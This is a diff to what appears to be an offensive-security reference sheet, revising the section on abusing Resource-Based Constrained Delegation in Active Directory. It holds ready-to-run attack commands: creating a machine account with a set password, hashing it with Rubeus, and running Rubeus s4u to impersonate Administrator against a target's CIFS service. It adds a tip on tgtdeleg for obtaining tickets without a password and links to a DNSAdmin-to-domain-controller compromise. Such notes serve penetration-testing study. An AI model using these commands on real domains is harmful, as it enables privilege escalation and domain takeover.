@@ -902,10 +902,10 @@ OR
 * * *
 
 # Resource-Based Constrained Delegation
-in RBCD its the backend service which sets the delegation parameters
-for this we need GenericWrite privileges on an RBCD server so, we can update the msDS-AllowedToActOnBehalfOfOtherIdentity and add the SID of a different computer.
+In RBCD its the backend service which sets the delegation parameters for the frontend service in the form of a SID in the _msDS-AllowedToActOnBehalfOfOtherIdentity_ property.
+For this we need GenericWrite privileges on a server configured with Resource-Based Constrained Delegation, we can then update the _msDS-AllowedToActOnBehalfOfOtherIdentity_ property to that of a Computer SID we control.
 
-we can create a new machine account, create a sid and set it, then run s4u as before - 
+For thiswe can simply create a new machine account, identify the corresponding SID, set that in the Servers _msDS-AllowedToActOnBehalfOfOtherIdentity_ property, and then run ```Rubeus s4u``` as we did for constrained delegation - 
 
 ```
 New-MachineAccount -MachineAccount <MachineAccountName> -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose
@@ -918,8 +918,9 @@ Rubeus.exe hash /password:'p@ssword!'
 Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt
 ```
 
-In Constrain and Resource-Based Constrained Delegation if we don't have the password/hash of the account with TRUSTED_TO_AUTH_FOR_DELEGATION that we try to abuse, we can use the very nice trick "tgt::deleg" from kekeo or "tgtdeleg" from rubeus and fool Kerberos to give us a valid TGT for that account. Then we just use the ticket instead of the hash of the account to perform the attack.
+**NOTE:** In Constrained and Resource-Based Constrained Delegation if we don't have the password/hash of the account with TRUSTED_TO_AUTH_FOR_DELEGATION that we try to abuse, we can use the very nice trick "tgt::deleg" from kekeo or "tgtdeleg" from rubeus and fool Kerberos to give us a valid TGT for that account. Then we just use the ticket instead of the hash of the account to perform the attack.
 
+-https://github.com/In3x0rabl3/OSEP/blob/main/osep_reference.md#pass-the-hash--cme--impacket--nc
 
 # DNS Admins
 https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
